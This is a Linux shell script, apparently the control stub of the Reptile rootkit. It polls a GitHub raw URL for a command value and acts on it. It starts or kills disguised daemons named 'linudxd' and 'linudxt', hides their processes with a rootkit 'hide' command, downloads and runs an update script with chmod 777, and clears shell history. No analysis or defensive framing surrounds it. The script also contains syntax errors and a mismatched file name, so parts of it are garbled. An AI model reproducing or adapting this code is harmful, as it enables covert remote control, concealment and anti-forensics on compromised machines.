#! /bin/sh

#<reptile> 
wget https://raw.githubusercontent.com/myvulweb/b3/master/1.txt -O /tmp/b3-singal-test.txt
ret=`cat /tmp/b3-singal-test.txt`
rm -rf /tmp/b3-singal-test.txt

cur_ver=`cat /bin/linudx-ver.txt`
echo $cur_ver
echo $ret

/linudx/linudx_cmd show `cat /bin/linudxd-pid`
/linudx/linudx_cmd show `cat /bin/linudxt-pid`
if [ "$ret" -eq 1 ]
then
	echo "start"
	if [ `ps -ef|grep /bin/linudxd | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started linudxd"
	else
		echo "need to start linudxd"
		/bin/linudxd &
		echo `pidof linudxd`>/bin/linudxd-pid
		/linudx/linudx_cmd hide `pidof linudxd`

		if [ `pidof linudxd` ];then
			echo "hide success"
		else
			/linudx/linudx_cmd hide `pidof linudxd`
			/linudx/linudx_cmd hide 
		if
	fi

	if [ `ps -ef|grep /bin/linudxt | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started linudxt"
	else
		echo "need to start linudxt"
		/bin/linudxt &
		echo `pidof linudxt`>/bin/linudxt-pid
		/linudx/linudx_cmd hide `pidof linudxt`
		if [ `pidof linudxt` ];then
			echo "hide success"
		else
			/linudx/linudx_cmd hide `pidof linudxt`
			/linudx/linudx_cmd hide 
		if
	fi

elif [ "$ret" -eq 0 ]
then
	echo "need to stop all"
	kill -9 `cat /bin/linudxd-pid`
	kill -9 `cat /bin/linudxt-pid`
elif [ "$ret" -gt "$cur_ver" ]
then
	echo "need to update"
	wget https://raw.githubusercontent.com/myvulweb/b3/master/in.sh -O /tmp/b3-in.sh
	chmod 777 /tmp/b3-in.sh
	/tmp/b2-in.sh
	rm -rf /tmp/b3-in.sh
	history -c

else
	echo "not defined!"
fi
#</reptile>

